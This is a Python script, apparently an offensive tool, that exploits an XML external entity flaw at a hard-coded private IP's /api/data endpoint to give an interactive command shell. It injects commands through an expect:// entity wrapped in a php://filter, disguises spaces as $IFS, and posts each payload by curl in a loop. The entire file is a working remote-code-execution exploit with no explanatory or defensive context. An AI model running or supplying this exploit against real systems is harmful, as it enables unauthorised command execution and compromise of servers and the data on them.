import subprocess
import shlex
import sys

# The target URL
url = 'http://172.20.57.43/api/data'

# The XML template with a placeholder for the command
xml_template = '''<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE UserData [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=expect://{command}">
]>
<UserData>
  <UserInformation>
    <UserName>test</UserName>
    <Country>test</Country>
    <ZipCode>test</ZipCode>
    <Location>test</Location>
    <CurrentLanguage>test</CurrentLanguage>
    <IPAddress>&xxe;</IPAddress>
    <ScreenSize>test</ScreenSize>
    <OperationSystem>test</OperationSystem>
    <LogDate>test</LogDate>
    <AvailableKeyboardLayouts>test</AvailableKeyboardLayouts>
    <Hardwares>test</Hardwares>
    <Antiviruses>test</Antiviruses>
  </UserInformation>
  <Passwords>
    <Password>
      <URL>test</URL>
      <Username>test</Username>
      <Password>test</Password>
      <Application>test</Application>
    </Password>
  </Passwords>
</UserData>
'''

def main():
    """
    Continuously prompts for commands to execute on the target via XXE.
    """
    print("--- Interactive XXE Shell ---")
    print("Enter commands to execute on the target.")
    print("Type 'exit' or 'quit' to terminate.")
    print("-" * 30)

    while True:
        try:
            # Get command from user
            user_command = input("cmd> ")

            if user_command.lower() in ['exit', 'quit']:
                print("Exiting.")
                break
            
            if not user_command:
                continue

            # Replace spaces with $IFS for shell compatibility on the target
            processed_command = user_command.replace(' ', '$IFS')

            # Inject the processed command into the XML payload
            xml_payload = xml_template.format(command=processed_command)

            # Construct the full curl command
            # Using -s for silent mode to get a cleaner output
            curl_command = [
                'curl', '-s', '-X', 'POST',
                '-H', 'Content-Type: application/xml',
                '-d', xml_payload,
                url
            ]

            # Execute the command with a 15-second timeout
            result = subprocess.run(
                curl_command, 
                capture_output=True, 
                text=True, 
                timeout=15
            )

            # The command output from the target is usually embedded in the XML response.
            # We print the full stdout from curl to see it.
            print(result.stdout)
            
            if result.stderr:
                print(f"--- Stderr ---\n{result.stderr}")

        except subprocess.TimeoutExpired:
            print("Error: The command timed out. The server may be slow or the command may be hanging.")
        except KeyboardInterrupt:
            print("\nExiting.")
            sys.exit(0)
        except Exception as e:
            print(f"An unexpected error occurred: {e}")
            break

if __name__ == "__main__":
    main()
